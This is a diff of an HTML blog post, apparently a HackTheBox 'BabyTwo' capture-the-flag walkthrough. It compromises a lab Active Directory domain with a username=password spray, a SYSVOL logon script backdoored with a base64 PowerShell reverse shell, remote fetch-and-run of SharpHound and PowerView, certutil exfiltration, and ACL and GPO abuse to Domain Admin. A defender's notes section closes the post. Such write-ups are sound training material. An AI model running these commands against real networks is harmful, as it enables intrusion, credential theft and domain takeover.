@@ -4,7 +4,7 @@
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>HackTheBox: BabyTwo — Satej Chaudhari</title>
-  <meta name="description" content="HackTheBox BabyTwo walkthrough — a guest-readable share leaks a user list, a username=password spray gets a foothold, a writable SYSVOL logon script catches a user, and a BloodHound-guided ACL to GPO abuse chain reaches Domain Admin.">
+  <meta name="description" content="In-depth HackTheBox BabyTwo walkthrough — guest-readable share leaks users, username=password spray, a writable SYSVOL logon script, then BloodHound-guided ACL and GPO abuse to Domain Admin, with defender notes.">
 
   <link rel="icon" type="image/svg+xml" href="../assets/img/favicon.svg">
 
@@ -61,111 +61,156 @@
         <h1 class="post-title">HackTheBox: BabyTwo</h1>
         <p class="post-meta">
           <time datetime="2026-10-02">2026-10-02</time>
-          <span>&middot; 11 min read</span>
+          <span>&middot; 14 min read</span>
         </p>
       </header>
 
       <div class="post-body">
 
-        <p><strong>BabyTwo</strong> is an Active Directory box (<code>baby2.vl</code>). A guest-readable share leaks a user list, a username-equals-password spray gets a foothold, a writable SYSVOL logon script is weaponised to catch a real user, and a BloodHound-guided ACL → GPO abuse chain reaches Domain Admin.</p>
+        <p><strong>BabyTwo</strong> is an Active Directory box (<code>baby2.vl</code>). Nothing here is a memory-corruption exploit — it is a chain of configuration and ACL mistakes, which is exactly how real AD estates fall. A guest-readable share hands over a user list, a username-equals-password habit gives the first login, a writable logon script in SYSVOL catches a live user, and from there <a href="../theory/2026-08-18-acls-dacls.html">ACL abuse</a> and <a href="../theory/2026-08-18-group-policy.html">GPO abuse</a> walk straight to Domain Admin.</p>
+
+        <h2>Attack chain at a glance</h2>
+
+        <ul>
+          <li><strong>Recon</strong> — standard DC port set; domain <code>baby2.vl</code>, DC <code>dc.baby2.vl</code>.</li>
+          <li><strong>User list</strong> — the <code>guest</code> account reads the <code>homes</code> share, whose folders are the domain usernames.</li>
+          <li><strong>Foothold</strong> — a username=password spray (<a href="../vuln-detail.html?vuln=weak-password-policy">weak password policy</a>) validates <code>Carl.Moore</code> and <code>library</code>.</li>
+          <li><strong>Lateral</strong> — <code>Carl.Moore</code> can write the SYSVOL logon script; backdoor it to catch <code>Amelia.Griffiths</code> when she logs on.</li>
+          <li><strong>Escalation</strong> — BloodHound shows Amelia can rewrite the ACL on <code>gpoadm</code> (<a href="../vuln-detail.html?vuln=ad-acl-abuse">ACL abuse</a>); reset its password, then use its GPO edit rights (<a href="../vuln-detail.html?vuln=gpp-passwords">GPO abuse</a>) to add it to local Administrators on the DC.</li>
+          <li><strong>Domain Admin</strong> — WinRM in as <code>gpoadm</code>; root flag.</li>
+        </ul>
 
         <h2>Reconnaissance</h2>
 
+        <p>The port set is the fingerprint of a domain controller — Kerberos (88), LDAP (389/636/3268/3269), SMB (445), the works. SMB signing is enabled and required, which quietly rules out an <a href="../vuln-detail.html?vuln=ntlm-relay-vuln">NTLM relay</a> path later.</p>
+
         <pre><code>nmap -Pn 10.129.2.55 -p53,88,135,139,389,445,464,593,636,3268,3269,3389 -sCV
 
-88/tcp  kerberos-sec   (domain: baby2.vl, dc.baby2.vl)
-389/tcp ldap           Microsoft Windows Active Directory LDAP
-445/tcp microsoft-ds
-3389/tcp ms-wbt-server  DNS_Computer_Name: dc.baby2.vl</code></pre>
+88/tcp   kerberos-sec  Microsoft Windows Kerberos (server time: ...Z)
+389/tcp  ldap          Microsoft Windows Active Directory LDAP
+|  Domain: baby2.vl, Site: Default-First-Site-Name
+445/tcp  microsoft-ds
+3389/tcp ms-wbt-server
+|  DNS_Computer_Name: dc.baby2.vl
+|_ smb2-security-mode: Message signing enabled and required</code></pre>
 
-        <h2>SMB enumeration &amp; a user=password spray</h2>
+        <h2>Enumeration — a free user list</h2>
 
-        <p>The guest account can enumerate shares; <code>homes</code> is readable and holds per-user folders:</p>
+        <p>AD often lets the built-in <code>guest</code> (or a null session) read more than it should. Here guest can enumerate shares, and two are writable — but the immediately useful one is <code>homes</code>, whose per-user folders <em>are</em> the domain's user list:</p>
 
         <pre><code>netexec smb 10.129.2.55 -u guest -p &#x27;&#x27; --shares
-  apps     READ
-  homes    READ,WRITE
-  ...
+  Share      Permissions   Remark
+  -----      -----------   ------
+  apps       READ
+  homes      READ,WRITE
+  NETLOGON   READ          Logon server share
+  SYSVOL                   Logon server share
 
 smbclient //10.129.2.55/homes -U guest
-  Amelia.Griffiths  Carl.Moore  Harry.Shaw  Joan.Jennings
-  Joel.Hurst  Kieran.Mitchell  library  Lynda.Bailey
-  Mohammed.Harris  Nicola.Lamb  Ryan.Jenkins</code></pre>
+smb: \&gt; ls
+  Amelia.Griffiths   Carl.Moore   Harry.Shaw   Joan.Jennings
+  Joel.Hurst   Kieran.Mitchell   library   Lynda.Bailey
+  Mohammed.Harris   Nicola.Lamb   Ryan.Jenkins</code></pre>
 
-        <p>Those folder names are a user list. Spraying username as password finds two hits:</p>
+        <p>Save those names to a file. The cheapest credential attack against a fresh user list is to try each name as its own password — lazy provisioning leaves these behind constantly. <code>--no-bruteforce</code> pairs line <em>i</em> of the user file with line <em>i</em> of the password file (one try each) instead of a full cross-product, so it is quiet:</p>
 
         <pre><code>nxc smb 10.129.2.55 -u bab2users.txt -p bab2users.txt --no-bruteforce --continue-on-success
 [+] baby2.vl\Carl.Moore:Carl.Moore
 [+] baby2.vl\library:library</code></pre>
 
-        <h2>Writable SYSVOL logon script</h2>
+        <h2>Lateral movement — a writable logon script</h2>
 
-        <p><code>Carl.Moore</code> has write access to SYSVOL, where a domain logon script lives:</p>
+        <p><code>Carl.Moore</code> can write to SYSVOL, the domain-wide share that every machine reads at boot and logon. Its <code>scripts</code> folder holds a logon script that maps drives for users as they sign in:</p>
 
-        <pre><code>smbclient -U &#x27;Carl.Moore%Carl.Moore&#x27; //baby2.vl/SYSVOL
-  \baby2.vl\scripts\login.vbs</code></pre>
+        <pre><code>netexec smb 10.129.2.55 -u &#x27;Carl.Moore&#x27; -p &#x27;Carl.Moore&#x27; --shares
+  SYSVOL   READ    (but the scripts folder is writable — verify by browsing)
 
-        <p>The script maps network drives for every user who logs on. Appending a line that runs a base64-encoded PowerShell reverse shell turns it into a trap, then re-upload it:</p>
+smbclient -U &#x27;Carl.Moore%Carl.Moore&#x27; //baby2.vl/SYSVOL
+smb: \&gt; cd baby2.vl\scripts\
+smb: \baby2.vl\scripts\&gt; get login.vbs</code></pre>
 
-        <pre><code>CreateObject(&quot;WScript.Shell&quot;).Run &quot;powershell -e JABjAGwAaQBl...&lt;reverse shell&gt;...&quot;, 0, True
-MapNetworkShare &quot;\\dc.baby2.vl\apps&quot;, &quot;V&quot;
-MapNetworkShare &quot;\\dc.baby2.vl\docs&quot;, &quot;L&quot;</code></pre>
+        <p>A logon script is remote code execution with someone else's identity — it runs as whichever user logs on next. Append a line that launches a base64-encoded PowerShell reverse shell (encoded so quoting survives the VBScript string), then overwrite the file:</p>
 
-        <pre><code>smb: \baby2.vl\scripts\&gt; del login.vbs
+        <pre><code>&#x27; --- appended to login.vbs ---
+CreateObject(&quot;WScript.Shell&quot;).Run &quot;powershell -e JABjAGwAaQBlAG4AdAAg...&lt;b64 reverse shell to 10.10.14.138:9001&gt;...&quot;, 0, True
+
+smb: \baby2.vl\scripts\&gt; del login.vbs
 smb: \baby2.vl\scripts\&gt; put login.vbs</code></pre>
 
-        <p>When a user logs on, the script fires and a shell returns — here as <code>amelia.griffiths</code>:</p>
+        <p>Start a listener and wait for a user to log on. Shortly, <code>Amelia.Griffiths</code> does, and her session runs our line:</p>
 
         <pre><code>nc -lvnp 9001
-connect to [10.10.14.138] from 10.129.2.55
-whoami
+connect to [10.10.14.138] from (UNKNOWN) [10.129.2.55]
+PS C:\Windows\system32&gt; whoami
 baby2\amelia.griffiths</code></pre>
 
         <figure>
-          <img src="../assets/img/htb-babytwo/img1.png" alt="Reverse shell received as amelia.griffiths from the logon script">
-          <figcaption>The poisoned logon script calls back as <code>amelia.griffiths</code>.</figcaption>
+          <img src="../assets/img/htb-babytwo/img1.png" alt="Reverse shell returning as amelia.griffiths from the poisoned logon script">
+          <figcaption>The backdoored logon script fires when Amelia signs in, returning a shell as her.</figcaption>
         </figure>
 
-        <h2>BloodHound → ACL &amp; GPO abuse</h2>
+        <h2>Mapping the domain with BloodHound</h2>
 
-        <p>SharpHound is staged and run from the shell, then the data is exfiltrated by base64-encoding the zip with <code>certutil</code> and decoding it locally:</p>
+        <p>With an interactive foothold, collect the graph. SharpHound is staged over an HTTP server (<code>certutil</code> as the downloader), run in-memory, and the resulting zip is carried back out by base64-encoding it with <code>certutil</code> — handy when you have a shell but no file transfer:</p>
 
-        <pre><code>Set-ExecutionPolicy Bypass -Scope Process
+        <pre><code>certutil -urlcache -split -f http://10.10.14.31:5555/SharpHound.ps1 sharp.ps1
+Set-ExecutionPolicy Bypass -Scope Process
 Import-Module .\sharp.ps1
 Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\temp
 
-certutil -encode C:\temp\...BloodHound.zip bh.txt   # -&gt; transfer -&gt; base64 -d</code></pre>
+certutil -encode C:\temp\&lt;ts&gt;_BloodHound.zip bh.txt   # transfer bh.txt, then:
+#   base64 -d bh.b64 &gt; bh.zip &amp;&amp; unzip bh.zip   -&gt; import into BloodHound</code></pre>
 
         <figure>
-          <img src="../assets/img/htb-babytwo/img2.png" alt="BloodHound graph showing the path from Amelia to Domain Admin">
-          <figcaption>BloodHound maps the route from <code>Amelia.Griffiths</code> onward.</figcaption>
+          <img src="../assets/img/htb-babytwo/img2.png" alt="BloodHound graph showing Amelia&#x27;s path toward Domain Admin">
+          <figcaption>BloodHound lays out the route: Amelia can write the ACL on the GPO-management account.</figcaption>
         </figure>
 
-        <p>Amelia can grant herself rights over <code>gpoadm</code>, then reset its password:</p>
+        <h2>Escalation — ACL abuse then GPO abuse</h2>
+
+        <p>BloodHound shows Amelia can grant herself rights over <code>gpoadm</code> and reset its password — a straight <a href="../theory/2026-08-18-acls-dacls.html">DACL-to-password-reset</a> primitive via PowerView:</p>
 
         <pre><code>iex (iwr -usebasicparsing http://10.10.14.31:5555/PowerView.ps1)
-add-domainobjectacl -rights all -targetidentity gpoadm -principalidentity Amelia.Griffiths
+Add-DomainObjectAcl -Rights All -TargetIdentity gpoadm -PrincipalIdentity Amelia.Griffiths
 $cred = ConvertTo-SecureString &#x27;Password123!&#x27; -AsPlainText -Force
-set-domainuserpassword gpoadm -accountpassword $cred</code></pre>
+Set-DomainUserPassword gpoadm -AccountPassword $cred
 
-        <p><code>gpoadm</code> can edit a GPO, so <code>pyGPOAbuse</code> is used to add it to the local Administrators group on the DC:</p>
+nxc smb 10.129.2.55 -u gpoadm -p &#x27;Password123!&#x27;
+[+] baby2.vl\gpoadm:Password123!</code></pre>
 
-        <pre><code>python3 pygpoabuse.py baby2.vl/GPOADM:Password123! \
+        <p>The name is a hint: <code>gpoadm</code> has edit rights over a Group Policy Object. Write access to a GPO linked to the domain (or to the DCs OU) is <a href="../theory/2026-08-18-group-policy.html">domain-wide code execution</a> — anything you put in the policy is applied by every machine in scope, as SYSTEM. <code>pyGPOAbuse</code> implements this by creating an immediate scheduled task inside the GPO; the simplest payoff is adding our account to the DC's local Administrators:</p>
+
+        <pre><code>python3 pygpoabuse.py baby2.vl/GPOADM:&#x27;Password123!&#x27; \
   -gpo-id 31B2F340-016D-11D2-945F-00C04FB984F9 \
   -command &#x27;net localgroup administrators GPOADM /add&#x27; -f
+[+] ScheduledTask TASK_b624ac9b created!
 
-[+] ScheduledTask created!</code></pre>
+# force the policy to apply (or wait for the refresh cycle):
+gpupdate /force</code></pre>
 
-        <pre><code>gpupdate /force      # (triggers the task)
+        <pre><code>net localgroup Administrators
+  Administrator
+  Domain Admins
+  Enterprise Admins
+  gpoadm                     &lt;- us
+
 nxc smb dc.baby2.vl -u gpoadm -p &#x27;Password123!&#x27;
 [+] baby2.vl\gpoadm:Password123! (Pwn3d!)</code></pre>
 
-        <p>With local admin on the DC, WinRM in and read the root flag:</p>
+        <p><code>(Pwn3d!)</code> means local admin on the DC — effectively Domain Admin. WinRM in and take the flag:</p>
 
         <pre><code>evil-winrm -i dc.baby2.vl -u GPOADM -p &#x27;Password123!&#x27;
 *Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt</code></pre>
 
-        <blockquote>Three independent misconfigurations stack here: a guest-readable user list, username=password accounts, and a writable logon script — any one closed would have broken the chain well before the GPO abuse.</blockquote>
+        <h2>Defender's notes</h2>
+
+        <ul>
+          <li>Lock down anonymous/guest SMB: it should not enumerate shares or the <code>homes</code> listing.</li>
+          <li>Kill username=password accounts and enforce a real password policy (<a href="../vuln-detail.html?vuln=weak-password-policy">weak password policy</a>).</li>
+          <li>SYSVOL scripts must be writable only by administrators — a writable logon script is domain-wide RCE.</li>
+          <li>Audit dangerous ACLs (GenericAll/WriteDacl/ForceChangePassword) with BloodHound on your own estate and remove the ones nobody can justify (<a href="../theory/2026-08-18-acls-dacls.html">ACLs & DACLs</a>).</li>
+          <li>Restrict who can edit GPOs and monitor for scheduled-task writes into SYSVOL policy folders (<a href="../theory/2026-08-18-group-policy.html">Group Policy</a>).</li>
+        </ul>
 
       </div>
     </article>
